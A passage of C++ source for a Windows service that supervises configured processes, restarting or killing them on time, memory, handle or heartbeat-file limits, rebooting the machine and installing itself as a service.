				lstrLog.Format(_T("Process %d:%s Started by CreateProcessAsUser in bUserInterface==3"),pProcess[nIndex].procInfo[0].dwProcessId,szCommandLine);
				WriteLog(pLogFile, lstrLog.GetBuffer(0));
			}

		}else
		{
			lbRet =  CreateProcessAsUser(lhToken,
				NULL,
				szCommandLine,
				NULL,
				NULL,
				FALSE,
				ldwCreateFlag,
				NULL,
				pWorkingDir,
				&startUpInfo,
				&(pProcess[nIndex].procInfo[0]));
		}
		if (NULL != lhToken)
		{
			try
			{
				CloseHandle(lhToken);

			}catch(...)
			{

			}
		}

		if(NULL != lpEnv)
		{
			DestroyEnvironmentBlock(lpEnv);
		}

		if (!lbRet)
		{
			long nError = GetLastError();
			sprintf(szTmp,"Failed to start program %s in %s as CurrentUser,CreateProcessAsUser error code = %d , try CreateProcess\n", szCommandLine, pWorkingDir, nError); 
			WriteLog(pLogFile, szTmp);

			lbRet = CreateProcess(NULL,szCommandLine,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS,NULL,pWorkingDir,&startUpInfo,&(pProcess[nIndex].procInfo[0]));

			if (!lbRet)
			{
				long nError = GetLastError();
				sprintf(szTmp,"Failed to start program %s in %s  after CreateProcessAsUser, CreateProcess error code = %d\n", szCommandLine, pWorkingDir, nError); 
				WriteLog(pLogFile, szTmp);
				return FALSE;
			}else
			{
				CString lstrLog;
				lstrLog.Format(_T("Process %d:%s Started by CreateProcess in Session 0"),pProcess[nIndex].procInfo[0].dwProcessId,szCommandLine);
				WriteLog(pLogFile, lstrLog.GetBuffer(0));

			}


		}else
		{
			CString lstrLog;
			lstrLog.Format(_T("Process %d:%s Started by CreateProcessAsUser "),pProcess[nIndex].procInfo[0].dwProcessId,szCommandLine);
			WriteLog(pLogFile, lstrLog.GetBuffer(0));
		}

	}
	else if(!CreateProcess(NULL,szCommandLine,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS,NULL,pWorkingDir,&startUpInfo,&(pProcess[nIndex].procInfo[0])))
	{
		long nError = GetLastError();
		sprintf(szTmp,"Failed to start program %s in %s, error code = %d\n", szCommandLine, pWorkingDir, nError); 
		WriteLog(pLogFile, szTmp);
		return FALSE;
	}else
	{
		CString lstrLog;
		lstrLog.Format(_T("Process %d:%s Started by CreateProcess in Session 0"),pProcess[nIndex].procInfo[0].dwProcessId,szCommandLine);
		WriteLog(pLogFile, lstrLog.GetBuffer(0));
	}

	if (NULL != hCurrentDesktop)
	{
		CloseDesktop(hCurrentDesktop);
	}

	nPauseSec = ::GetPrivateProfileInt(szItem, "PauseAfterStart", 5, pInitFile);

	::Sleep(nPauseSec * CLOCKS_PER_SEC);

	pProcess[nIndex].nInstCount = 1;

	return TRUE;
}

BOOL EndProcess(int nIndex,ProcessQuerytor & arefQuery) 
{
	if (nIndex<0 || nIndex>=nProcCount)
	{
		return FALSE;
	}
	// terminate all process instances of the same process
	char szItem[c_nMaxSize] = "";

	sprintf(szItem,"Process%d",nIndex);

	unsigned int nPauseSec = ::GetPrivateProfileInt(szItem, "PauseEnd", 1, pInitFile);

	::Sleep(nPauseSec*CLOCKS_PER_SEC);

	if (!::FindProcess(nIndex,arefQuery))
	{
		return TRUE;
	}

	int nTerminated = 0;

	for (int i = 0; i < pProcess[nIndex].nInstCount; i++)
	{
		if (!::TerminateProcess(pProcess[nIndex].procInfo[i].hProcess, 0))
		{
			try
			{
				if (pProcess[nIndex].procInfo[i].hThread!=NULL)
				{
					CloseHandle(pProcess[nIndex].procInfo[i].hThread);
					pProcess[nIndex].procInfo[i].hThread = NULL;
				}

			}catch(...)
			{

			}

			try
			{
				if (pProcess[nIndex].procInfo[i].hProcess!=NULL)
				{
					CloseHandle(pProcess[nIndex].procInfo[i].hProcess);
					pProcess[nIndex].procInfo[i].hProcess = NULL;
				}


			}catch(...)
			{

			}

			::sprintf(szItem, 
				"Failed to terminate one of the instances of process %d. process id: %d ; process handle: %d ; ErroCode :%d ", 
				nIndex, 
				pProcess[nIndex].procInfo[i].dwProcessId,
				pProcess[nIndex].procInfo[i].hProcess,
				GetLastError());

			WriteLog(pLogFile, szItem);

			continue;
		}		

		try
		{
			if (pProcess[nIndex].procInfo[i].hThread!=NULL)
			{
				CloseHandle(pProcess[nIndex].procInfo[i].hThread);
				pProcess[nIndex].procInfo[i].hThread = NULL;
			}

		}catch(...)
		{

		}

		try
		{
			if (pProcess[nIndex].procInfo[i].hProcess!=NULL)
			{
				CloseHandle(pProcess[nIndex].procInfo[i].hProcess);
				pProcess[nIndex].procInfo[i].hProcess = NULL;
			}


		}catch(...)
		{

		}

		++nTerminated;
	}

	nPauseSec = ::GetPrivateProfileInt(szItem, "PauseAfterEnd", 5, pInitFile);

	::Sleep(nPauseSec*CLOCKS_PER_SEC);

	return (nTerminated>=pProcess[nIndex].nInstCount);
}
#ifndef EWX_RESTARTAPPS
#define EWX_RESTARTAPPS 0x00000040
#endif

BOOL SystemShutdown(UINT nSDType)
{
	HANDLE           hToken;
	TOKEN_PRIVILEGES tkp   ;

	::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken);
	::LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

	tkp.PrivilegeCount          = 1                   ; // set 1 privilege
	tkp.Privileges[0].Attributes= SE_PRIVILEGE_ENABLED;

	// get the shutdown privilege for this process
	::AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	BOOL  lbRet = FALSE;
	switch (nSDType)
	{
	case 0: lbRet = ::ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE, 0); break;
	case 1: lbRet =::ExitWindowsEx(EWX_POWEROFF|EWX_FORCE, 0); break;
	case 2: lbRet =::ExitWindowsEx(EWX_REBOOT  |EWX_FORCE, 0); break;
	default:
		lbRet = ExitWindowsEx(EWX_REBOOT  |EWX_FORCE, 0); break;
	}

	return lbRet;
}


BOOL GetShutDownPrivilege()
{
	HANDLE hToken = NULL; 


	TOKEN_PRIVILEGES tkp;

	HandleWatchDog loHandleWatchDog;

	loHandleWatchDog.SetHandle(hToken);
	// Get a token for this process.
	if (!OpenProcessToken(	GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken	))
	{
		return FALSE;
	}

	// Get the LUID for the shutdown privilege.
	LookupPrivilegeValue(NULL,
		SE_SHUTDOWN_NAME, 
		&tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1; // one privilege to set
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


	// Get the shutdown privilege for this process.
	AdjustTokenPrivileges(hToken, 
		FALSE, 
		&tkp, 
		0,
		(PTOKEN_PRIVILEGES)NULL, 
		0);


	// Cannot test the return value of AdjustTokenPrivileges.
	if (GetLastError() != ERROR_SUCCESS)
	{
		return FALSE;
	}

	return TRUE;

}

BOOL RemoteRebootComputer()
{
	USES_CONVERSION;

	HANDLE hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
	DWORD len =0;
	TCHAR CurrentDesktopName[c_nMaxSize] = _T("");
	int lnShowMode = SW_SHOW;
	DWORD  ldwCreateFlag = NORMAL_PRIORITY_CLASS;

	::GetUserObjectInformation(hCurrentDesktop,UOI_NAME,CurrentDesktopName,MAX_PATH,&len);
	STARTUPINFOW startUpInfo = { sizeof(STARTUPINFOW),NULL,A2W(""),NULL,0,0,0,0,0,0,0,STARTF_USESHOWWINDOW,0,0,NULL,0,0,0}; 




	startUpInfo.wShowWindow = lnShowMode;
	startUpInfo.lpDesktop = T2W(CurrentDesktopName);	

	CString lstrLoader = _T("TrayRefresher.exe");

	BOOL lbRet =GetSpecPrivilege(SE_DEBUG_NAME);
	lbRet = GetSpecPrivilege(SE_TCB_NAME );
	HANDLE lhToken = NULL;
	HandleWatchDog loWatchDog;

	int lnSid = GetSessionId();

	if (lnSid>=0)
	{
		lbRet = WTSQueryUserToken (lnSid, &lhToken); 
	}else
	{
		lbRet = WTSQueryUserToken (WTSGetActiveConsoleSessionId(), &lhToken); 
	}

	DWORD ldwErroCode =0;

	if (!lbRet)
	{
		ldwErroCode = GetLastError();		 
	}

	if (NULL!= lhToken)
	{
		loWatchDog.SetHandle(lhToken);
	}

	PROCESS_INFORMATION loProcessInformation = {0};

	PROCESS_INFORMATION * lpProcessInformation = &loProcessInformation;

	if (lbRet)
	{	   
		startUpInfo.wShowWindow = SW_HIDE;
		CStringW lpCurrentDirectory = T2W(GetAppPath());
		CString lstrCommand;
		lstrCommand.Format(_T("%s/%s /reboot"),W2T(lpCurrentDirectory),lstrLoader);
		lbRet = CreateProcessAsUserW( lhToken,
			NULL,
			T2W(lstrCommand),
			NULL,
			NULL,
			FALSE,
			ldwCreateFlag,
			NULL,
			lpCurrentDirectory,
			&startUpInfo,
			lpProcessInformation);


		{
			DWORD ldwCreate =  WaitForSingleObject(lpProcessInformation->hProcess,-1);
			if (ldwCreate == 0x00000000L)
			{

				::GetExitCodeProcess(lpProcessInformation->hProcess,(DWORD *)&lbRet);
			}
		}
	}

	return lbRet;
}


BOOL ReBootComputer(ProcessQuerytor & arefQuery)
{
	BOOL lbRet = GetShutDownPrivilege();

	DWORD ldwRet = 0;

	if (lbRet)
	{
		for(int i = 0; i < nProcCount; i++)
		{
			EndProcess(i,arefQuery);
		}

		try
		{
			char szServiceName [c_nMaxSize] = "";

			::GetPrivateProfileString("Settings","ServiceStopBeforeRebootComputer", "MSSQLSERVER",szServiceName , c_nMaxSize, pInitFile);

			KillService(szServiceName);
		}
		catch (...)
		{

		}

		lbRet = ExitWindowsEx(EWX_FORCE  | EWX_REBOOT, SHTDN_REASON_MINOR_MAINTENANCE);  

		ldwRet = GetLastError();
	}

	if (lbRet<=0)
	{
		BOOL lbRet2= SystemShutdown(2);

		ldwRet = GetLastError();

		if (!lbRet2)
		{
			RemoteRebootComputer();
		}
	}



	return lbRet;
}

inline bool ParseDateTime(LPCTSTR lpszDate, 
						  DATE & m_dt, 
						  DateTimeStatus & m_status,
						  DWORD dwFlags = 0,
						  LCID lcid = LANG_USER_DEFAULT )
{
	USES_CONVERSION_EX;
	LPCTSTR pszDate = ( lpszDate == NULL ) ? _T("") : lpszDate;

	HRESULT hr;
	LPOLESTR p = T2OLE_EX((LPTSTR)pszDate, _ATL_SAFE_ALLOCA_DEF_THRESHOLD);
#ifndef _UNICODE
	if( p == NULL )
	{
		m_dt = 0;
		m_status = invalid;
		return false;
	}
#endif // _UNICODE

	if (FAILED(hr = VarDateFromStr( p, lcid, dwFlags, &m_dt )))
	{
		if (hr == DISP_E_TYPEMISMATCH)
		{

			m_dt = 0;
			m_status = invalid;
			return false;
		}
		else if (hr == DISP_E_OVERFLOW)
		{

			m_dt = -1;
			m_status = invalid;
			return false;
		}
		else
		{

			m_dt = -1;
			m_status = invalid;
			return false;
		}
	}

	m_status = valid;
	return true;
}
//判断是否设定了在指定时间杀死进程
COleDateTime golastCheckTime;
COleDateTimeSpan goTimeSpan;
BOOL IsProcessShouldBeKilledForTime(int nIndex)
{
	int lnProcessTime = 0;
	//计算程序运行所需时间
	if (golastCheckTime.GetYear()<2010)
	{
		golastCheckTime = COleDateTime::GetCurrentTime();
	}else
	{
		if (0== nIndex)
		{
			goTimeSpan = golastCheckTime - COleDateTime::GetCurrentTime();

			golastCheckTime = COleDateTime::GetCurrentTime();

		}

		lnProcessTime = goTimeSpan.GetTotalSeconds();
	}



	CString lstrEndTime;

	int lnBufferLength = 10240;

	char szItem[c_nMaxSize] = "";

	sprintf(szItem,"Process%d",nIndex);

	::GetPrivateProfileString(	szItem,
		"ProcessEndTimeAt",
		"",
		lstrEndTime.GetBufferSetLength(lnBufferLength),
		c_nMaxSize,
		pInitFile);

	lstrEndTime.ReleaseBuffer();

	if (lstrEndTime.Trim().GetLength()==0)
	{
		return FALSE;
	}

	try
	{
		COleDateTime loDateTimeToEnd;

		if (loDateTimeToEnd.ParseDateTime(lstrEndTime))
		{
			int lnYear = loDateTimeToEnd.GetYear();

			int lnMonth = loDateTimeToEnd.GetMonth();

			int lnDay   = loDateTimeToEnd.GetDay();

			int lnHour = loDateTimeToEnd.GetHour();

			int lnMinitue = loDateTimeToEnd.GetMinute();

			int lnSecond = loDateTimeToEnd.GetSecond();

			COleDateTime loDateTimeNow = golastCheckTime;

			if (lnYear<2010)
			{
				loDateTimeToEnd =  COleDateTime(	loDateTimeNow.GetYear(),
					loDateTimeNow.GetMonth(),
					loDateTimeNow.GetDay(),
					lnHour,
					lnMinitue,
					lnSecond);
			}



			COleDateTimeSpan loDateSpan = loDateTimeNow - loDateTimeToEnd;

			//int nInterval = ::GetPrivateProfileInt("Settings", "CheckProcess", 60, pInitFile);

			//nInterval = nInterval+goTimeSpan.GetTotalSeconds();

			double lnDblCheckLimitation = lnProcessTime/2.0;

			int lnSecondsSpan = (int)loDateSpan.GetTotalSeconds();

			if (abs(lnSecondsSpan)<=(abs(lnDblCheckLimitation)))
			{
				OutputDebugString(_T("ShouldKillProcess \r\n"));
				char szInfo[c_nMaxSize] = "";
				sprintf(szInfo,"Process %s should be killed at time.", pProcess[nIndex].szRealProcessName);
				WriteLog(pLogFile, szInfo);
				return TRUE;
			}

		}		

	}catch(...)
	{
		OutputDebugString(_T("Error IsShouldKillProcess\r\n"));
	}

	return FALSE;
}

BOOL IsProcessShouldBeKilledForMemHandle(int nIndex,ProcessQuerytor & arefQuery)
{
	//1.reEnumateProcess
	if (!FindProcess(nIndex,arefQuery))
	{
		return FALSE;
	}

	//2.getProcessMemoryLimitation HandleLimitation
	char szItem[c_nMaxSize] = "";
	sprintf(szItem,"Process%d",nIndex);

	int ldblMemLimit = ::GetPrivateProfileInt(	szItem,
		"ProcessEndMemAt",
		0,
		pInitFile);




	int lnHandleLimitation = ::GetPrivateProfileInt(	szItem,
		"ProcessEndHandleAt",
		0,
		pInitFile);



	if (lnHandleLimitation == 0)
	{
		lnHandleLimitation = 7000;
	}



	//3.getProcessMemoryStatus,handleCount and Compare
	for (int i =0;i< pProcess[nIndex].nInstCount;i++)
	{

		//3.0 mem
		HANDLE lhProcess = pProcess[nIndex].procInfo[i].hProcess;
		PROCESS_MEMORY_COUNTERS pmc = {0};
		BOOL lbRet = GetProcessMemoryInfo( lhProcess, &pmc, sizeof(pmc));

		if (lbRet)
		{
			if (ldblMemLimit>0)
			{
				double MemroyUsedInMB = (double)pmc.WorkingSetSize/1024.0/1024.0;
				if (MemroyUsedInMB>ldblMemLimit)
				{
					char szInfo[c_nMaxSize] = "";
					sprintf(szInfo,
						"Process %s should be killed For Memory Reach Limitation current:%8.2fMB Limitation:%8.2f.", 
						pProcess[i].szRealProcessName,
						MemroyUsedInMB,
						ldblMemLimit);
					WriteLog(pLogFile, szInfo);
					return TRUE;
				}
			}

			if (lnHandleLimitation>0)
			{
				//3.1 handle
				DWORD lnHandleCount = 0;
				::GetProcessHandleCount(lhProcess,&lnHandleCount);
				if ((int)lnHandleCount>lnHandleLimitation)
				{
					char szInfo[c_nMaxSize] = "";
					sprintf(szInfo,
						"Process %s should be killed for handle count reach Limitation current:%d Limitation:%d.", 
						pProcess[i].szRealProcessName,
						lnHandleCount,
						lnHandleLimitation);
					WriteLog(pLogFile, szInfo);
					return TRUE;
				}
			}//if (lnHandleLimitation>0)
		}//if (lbRet)
	}
	return FALSE;
}
BOOL IsProcessShouldBeKilledForCpu(int nIndex)
{
	return FALSE;
}
BOOL IsShouldKillProcess(int nIndex,ProcessQuerytor& arefQuery)
{
	GRemoteServer.StartDebugger();
	BOOL lbShouldKillAllProcess = GRemoteServer.ShouldStopAllProcess();
	if(lbShouldKillAllProcess)
	{
		return TRUE;
	}
	BOOL lbRet = FALSE;
	//MessageBox(NULL,"test",NULL,MB_OK);
	//1. at time?
	lbRet = IsProcessShouldBeKilledForTime(nIndex);
	if (lbRet)
	{

		return lbRet;
	}

	//2. cpu?
	lbRet = IsProcessShouldBeKilledForCpu(nIndex);
	if (lbRet)
	{
		return lbRet;
	}

	//3. mem?. handle?
	lbRet = IsProcessShouldBeKilledForMemHandle(nIndex,arefQuery);
	if (lbRet)
	{
		return lbRet;
	}
	return lbRet;
}
///检查进程是否已经假死，若假死就直接Kill
BOOL IsProcessAlive(int nIndex,ProcessQuerytor & arefQuery)
{
	//MessageBox(NULL,"test",NULL,MB_OK);

	if(nIndex<0 && nIndex>=nProcCount)
	{
		return TRUE;
	}

	char szFileName[c_nMaxSize] = "";
	char szWorkingDir[c_nMaxSize] = "";
	char szItem[c_nMaxSize] = "";
	char szInfo[512] = "";
	int  nInterval = 0;
	int lbReBootComputer = FALSE;

	sprintf(szItem,"Process%d",nIndex);

	::GetPrivateProfileString(szItem,"CheckFileName", "", szFileName, c_nMaxSize, pInitFile);

	if (0 == strlen(szFileName))
	{
		//使用被监控进程所在目录下，同名的txt文件作为被监控文件
		if (NULL != pProcess)
		{
			CString lstrProcessFileName = pProcess[nIndex].szRealProcessName;

			lstrProcessFileName = lstrProcessFileName.MakeLower();

			if (lstrProcessFileName.GetLength() >4)
			{
				int lnExeIndex = lstrProcessFileName.Find(_T(".exe"),0);

				if (lnExeIndex > 0)
				{
					lstrProcessFileName = pProcess[nIndex].szRealProcessName;

					lstrProcessFileName = lstrProcessFileName.Mid(0,lnExeIndex);

					lstrProcessFileName += _T(".txt");

					if (lstrProcessFileName.GetLength() >0)
					{
						strcpy(szFileName,lstrProcessFileName.GetBuffer(0));
					}
				}
			}			
		}
	}

	nInterval = ::GetPrivateProfileInt(szItem,"TimeSpan",60,pInitFile);	

	if (nInterval > 0)
	{
		OFSTRUCT fs;

		HFILE hFile = ::OpenFile(szFileName, &fs, OF_READ|OF_SHARE_DENY_NONE);

		if (hFile == HFILE_ERROR)
		{
			sprintf(szInfo,"Failed to read monitor file %s; it will then be created.", szFileName);

			WriteLog(pLogFile, szInfo);

			HANDLE hd = ::CreateFile(szFileName, 
				GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, 
				NULL, 
				OPEN_ALWAYS, 
				FILE_ATTRIBUTE_NORMAL, 
				NULL);

			if (hd == INVALID_HANDLE_VALUE)
			{
				::sprintf(szInfo, "failed to create file %s!", szFileName);
			}
			else
			{
				::sprintf(szInfo, "created file %s successfully!", szFileName);
			}

			if (hd!=NULL)
			{
				try
				{
					::CloseHandle(hd);

				}catch(...)
				{

				}
			}		

			WriteLog(pLogFile, szInfo);
		}
		else
		{
			FILETIME filetmCreated, filetmModified, filetmAccessed, filetmLocal;
			SYSTEMTIME systmModified, systmCurrent;
			::sprintf(szInfo, "File: %s", szFileName);
			WriteLog(pLogFile, szInfo, TRUE);
			::GetFileTime((HANDLE)hFile, &filetmCreated, &filetmAccessed, &filetmModified);
			try
			{
				::CloseHandle((HANDLE)hFile);

			}catch(...)
			{

			}
			::FileTimeToLocalFileTime(&filetmModified, &filetmLocal);
			::FileTimeToSystemTime(&filetmLocal, &systmModified);
			::GetLocalTime(&systmCurrent);
			::sprintf(szInfo, "modified time: %04d-%02d-%02d %02d:%02d:%02d",\
				systmModified.wYear, systmModified.wMonth, systmModified.wDay, systmModified.wHour, systmModified.wMinute, systmModified.wSecond);
			WriteLog(pLogFile, szInfo, TRUE);
			::sprintf(szInfo, "current time: %04d-%02d-%02d %02d:%02d:%02d",\
				systmCurrent.wYear, systmCurrent.wMonth, systmCurrent.wDay, systmCurrent.wHour, systmCurrent.wMinute, systmCurrent.wSecond);
			WriteLog(pLogFile, szInfo, TRUE);
			int nDiffSecs = TimeDiffInSec(systmCurrent, systmModified);
			::sprintf(szInfo, "time difference: %d seconds", nDiffSecs);
			WriteLog(pLogFile, szInfo, TRUE);

			if (nDiffSecs > nInterval)		// 判断进程是否死掉
			{
				if (EndProcess(nIndex,arefQuery))
				{
					sprintf(szInfo,"File %s is not active. Terminated the process successfully.", pProcess[nIndex].szRealProcessName);		
				}
				else
				{
					sprintf(szInfo, "File %s is not active. But failed to terminate the process!", pProcess[nIndex].szRealProcessName);
				}

				WriteLog(pLogFile, szInfo);

				return FALSE;
			}
		}
	}else
	{
		return FindProcess(nIndex,arefQuery);
	}

	return TRUE;
}

/// bounce the process with given index
BOOL BounceProcess(char* pName, int nIndex) 
{ 

	char szTmp[c_nMaxSize] = "";
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 

	if (schSCManager==0)
	{
		long nError = GetLastError();
		sprintf(szTmp, "OpenSCManager failed, error code = %d", nError);
		WriteLog(pLogFile, szTmp);
	}
	else
	{
		// open the service
		SC_HANDLE schService = OpenService( schSCManager, pName, SERVICE_ALL_ACCESS);
		if (schService==0) 
		{
			long nError = GetLastError();
			sprintf(szTmp, "OpenService failed, error code = %d", nError); 
			WriteLog(pLogFile, szTmp);
		}
		else
		{
			// call ControlService to invoke handler
			SERVICE_STATUS status;
			if(nIndex>=0&&nIndex<128)
			{
				if(ControlService(schService,(nIndex|0x80),&status))
				{
					CloseServiceHandle(schService); 
					CloseServiceHandle(schSCManager); 
					return TRUE;
				}
				else
				{
					long nError = GetLastError();
					sprintf(szTmp, "ControlService failed, error code = %d", nError); 
					WriteLog(pLogFile, szTmp);
				}
			}
			else
			{
				sprintf(szTmp, "Invalid argument to BounceProcess: %d", nIndex); 
				WriteLog(pLogFile, szTmp);
			}
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager); 
	}
	return FALSE;
}

/// kill service with given name
BOOL KillService(char* pName) 
{
	char szTmp[c_nMaxSize] = "";
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) 
	{
		long nError = GetLastError();
		sprintf(szTmp, "OpenSCManager failed, error code = %d", nError);
		WriteLog(pLogFile, szTmp);
	}
	else
	{
		// open the service
		SC_HANDLE schService = OpenService( schSCManager, pName, SERVICE_ALL_ACCESS);
		if (schService==0) 
		{
			long nError = GetLastError();
			sprintf(szTmp, "OpenService failed, error code = %d", nError);
			WriteLog(pLogFile, szTmp);
		}
		else
		{
			// call ControlService to kill the given service
			SERVICE_STATUS status;
			if(ControlService(schService,SERVICE_CONTROL_STOP,&status))
			{
				CloseServiceHandle(schService); 
				CloseServiceHandle(schSCManager); 
				return TRUE;
			}
			else
			{
				long nError = GetLastError();
				sprintf(szTmp, "ControlService failed, error code = %d", nError);
				WriteLog(pLogFile, szTmp);
			}
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager); 
	}
	return FALSE;
}

// run service with given name
BOOL RunService(char* pName, int nArg, char** pArg) 
{ 
	char szTmp[c_nMaxSize] = "";
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) 
	{
		long nError = GetLastError();
		sprintf(szTmp, "OpenSCManager failed, error code = %d", nError);
		WriteLog(pLogFile, szTmp);
	}
	else
	{
		// open the service
		SC_HANDLE schService = OpenService( schSCManager, pName, SERVICE_ALL_ACCESS);
		if (schService==0) 
		{
			long nError = GetLastError();
			sprintf(szTmp, "OpenService failed, error code = %d", nError);
			WriteLog(pLogFile, szTmp);
		}
		else
		{
			// call StartService to run the service
			if(StartService(schService,nArg,(const char**)pArg))
			{
				CloseServiceHandle(schService); 
				CloseServiceHandle(schSCManager); 
				return TRUE;
			}
			else
			{
				long nError = GetLastError();
				sprintf(szTmp, "StartService failed, error code = %d", nError);
				WriteLog(pLogFile, szTmp);
			}

			CloseServiceHandle(schService); 
		}

		CloseServiceHandle(schSCManager); 
	}
	return FALSE;
}

//////////////////////////////////////////////////////////////////// 

//This routine gets used to start your service

VOID WINAPI XYNTServiceMain( DWORD dwArgc, LPTSTR *lpszArgv )
{
	//	Sleep(10000);
	char szTmp[c_nMaxSize] = "";
	DWORD   status = 0; 
	DWORD   specificError = 0xfffffff; 

	serviceStatus.dwServiceType        = SERVICE_WIN32; 
	serviceStatus.dwCurrentState       = SERVICE_START_PENDING; 
	serviceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
	serviceStatus.dwWin32ExitCode      = 0; 
	serviceStatus.dwServiceSpecificExitCode = 0; 
	serviceStatus.dwCheckPoint         = 0; 
	serviceStatus.dwWaitHint           = 0; 

	hServiceStatusHandle = RegisterServiceCtrlHandler(pServiceName, XYNTServiceHandler); 
	if (hServiceStatusHandle==0) 
	{
		long nError = GetLastError();
		sprintf(szTmp, "RegisterServiceCtrlHandler failed, error code = %d\n", nError);
		WriteLog(pLogFile, szTmp);
		return; 
	} 

	// Initialization complete - report running status 
	serviceStatus.dwCurrentState       = SERVICE_RUNNING; 
	serviceStatus.dwCheckPoint         = 0; 
	serviceStatus.dwWaitHint           = 0;  
	if(!SetServiceStatus(hServiceStatusHandle, &serviceStatus)) 
	{ 
		long nError = GetLastError();
		sprintf(szTmp, "SetServiceStatus failed, error code = %d\n", nError);
		WriteLog(pLogFile, szTmp);
	} 


}
void InitProcess(ProcessQuerytor & arefQuery)
{

	for(int i=0;i<nProcCount;i++)
	{
		::memset(pProcess[i].procInfo, 0, sizeof(pProcess[i].procInfo));

		StartProcess(i,arefQuery);
	}
}


//////////////////////////////////////////////////////////////////// 

//This routine responds to events concerning your service, like start/stop

VOID WINAPI XYNTServiceHandler(DWORD fdwControl)
{
	ProcessQuerytor loQuery;
	char szTmp[c_nMaxSize] = "";

	DWORD ldwWtRet = 0;

	switch(fdwControl) 
	{
	case SERVICE_CONTROL_STOP:
	case SERVICE_CONTROL_SHUTDOWN:
		serviceStatus.dwWin32ExitCode = 0; 
		serviceStatus.dwCurrentState  = SERVICE_STOPPED; 
		serviceStatus.dwCheckPoint    = 0; 
		serviceStatus.dwWaitHint      = 0;


		//terminate the checkThread

		//set the process end signal
		g_bServiceShutDown = TRUE;

		//wait thread to end for 5 seconds
		ldwWtRet = WaitForSingleObject(g_hCheckThread,5*CLOCKS_PER_SEC);

		//if thread is still running,just end it
		if (WAIT_TIMEOUT == ldwWtRet)
		{
			try
			{
				TerminateThread(g_hCheckThread,-2);
			}
			catch (...)
			{

			}
		}

		// terminate all processes started by this service before shutdown
		{
			for(int i = 0; i < nProcCount; i++)
			{
				EndProcess(i,loQuery);
			}

			if (!SetServiceStatus(hServiceStatusHandle, &serviceStatus))
			{ 
				long nError = GetLastError();
				sprintf(szTmp, "SetServiceStatus failed, error code = %d\n", nError);
				WriteLog(pLogFile, szTmp);
			}
		}
		return; 
	case SERVICE_CONTROL_PAUSE:
		serviceStatus.dwCurrentState = SERVICE_PAUSED; 
		break;
	case SERVICE_CONTROL_CONTINUE:
		serviceStatus.dwCurrentState = SERVICE_RUNNING; 
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default: 
		// bounce processes started by this service
		if(fdwControl>=128&&fdwControl<256)
		{
			int nIndex = fdwControl&0x7F;
			// bounce a single process
			if(nIndex>=0 && nIndex<nProcCount)
			{
				EndProcess(nIndex,loQuery);
				StartProcess(nIndex,loQuery);
			}
			// bounce all processes
			else if(nIndex==127)
			{
				for(int i=nProcCount-1;i>=0;i--)
				{
					EndProcess(i,loQuery);
				}
				for(i=0;i<nProcCount;i++)
				{
					StartProcess(i,loQuery);
				}
			}
		}
		else
		{
			sprintf(szTmp,  "Unrecognized op code %d\n", fdwControl);
			WriteLog(pLogFile, szTmp);
		}
	};
	if (!SetServiceStatus(hServiceStatusHandle,  &serviceStatus)) 
	{ 
		long nError = GetLastError();
		sprintf(szTmp, "SetServiceStatus failed, error code = %d\n", nError);
		WriteLog(pLogFile, szTmp);
	} 
}


//////////////////////////////////////////////////////////////////// 

//Uninstall

VOID UnInstall(char* pName)
{
	char szTmp[c_nMaxSize] = "";
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) 
	{
		long nError = GetLastError();
		sprintf(szTmp, "OpenSCManager failed, error code = %d\n", nError);
		WriteLog(pLogFile, szTmp);
	}
	else
	{
		SC_HANDLE schService = OpenService( schSCManager, pName, SERVICE_ALL_ACCESS);
		if (schService==0) 
		{
			long nError = GetLastError();
			sprintf(szTmp, "OpenService failed, error code = %d\n", nError);
		}
		else
		{
			if(!DeleteService(schService)) 
				sprintf(szTmp, "Failed to remove service %s\n", pName);
			else 
				sprintf(szTmp, "Service %s removed\n",pName);
			WriteLog(pLogFile, szTmp);
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager);	
	}
}

//////////////////////////////////////////////////////////////////// 

//Install

VOID Install(char* pPath, char* pName) 
{  
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	char szTmp[c_nMaxSize] = "";
	if (schSCManager==0) 
	{
		long nError = GetLastError();
		sprintf(szTmp, "OpenSCManager failed, error code = %d\n", nError);
		WriteLog(pLogFile, szTmp);
	}
	else
	{
		SC_HANDLE schService = CreateService
			( 
			schSCManager,											/* SCManager database      */ 
			pName,													/* name of service         */ 
			pName,													/* service name to display */ 
			SERVICE_ALL_ACCESS,										/* desired access          */ 
			SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS , /* service type            */ 
			SERVICE_AUTO_START,										/* start type              */ 
			SERVICE_ERROR_NORMAL,									/* error control type      */ 
			pPath,													/* service's binary        */ 
			NULL,													/* no load ordering group  */ 
			NULL,													/* no tag identifier       */ 
			NULL,													/* no dependencies         */ 
			NULL,													/* LocalSystem account     */ 
			NULL
			);                     /* no password             */ 
		if (schService==0) 
		{
			long nError =  GetLastError();
			sprintf(szTmp, "Failed to create service %s, error code = %d\n", pName, nError);
